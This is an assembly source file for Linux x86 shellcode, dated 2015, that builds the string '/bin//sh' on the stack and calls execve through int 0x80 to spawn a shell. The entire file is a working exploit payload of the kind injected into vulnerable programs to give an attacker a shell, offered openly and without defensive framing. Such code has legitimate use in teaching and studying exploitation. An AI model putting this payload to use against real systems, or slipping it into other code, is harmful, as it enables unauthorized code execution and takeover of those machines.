    #
    # Execve /bin/sh Shellcode Via Push (Linux x86)
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 18 February 2015
    #
    # GPL
    #


    .global _start
_start:
    xorl %ecx, %ecx

    # '\x00'
    pushl %ecx
    # 'h' 's' '/' '/'
    pushl $0x68732f2f
    # 'n' 'i' 'b' '/'
    pushl $0x6e69622f

    # const char *filename
    movl %esp, %ebx

    # __NR_execve 11
    # movb $11, %al
    pushl $11
    popl %eax

    # char *const argv[]
    # xorl %ecx, %ecx

    # char *const envp[]
    # xorl %edx, %edx

    int $0x80
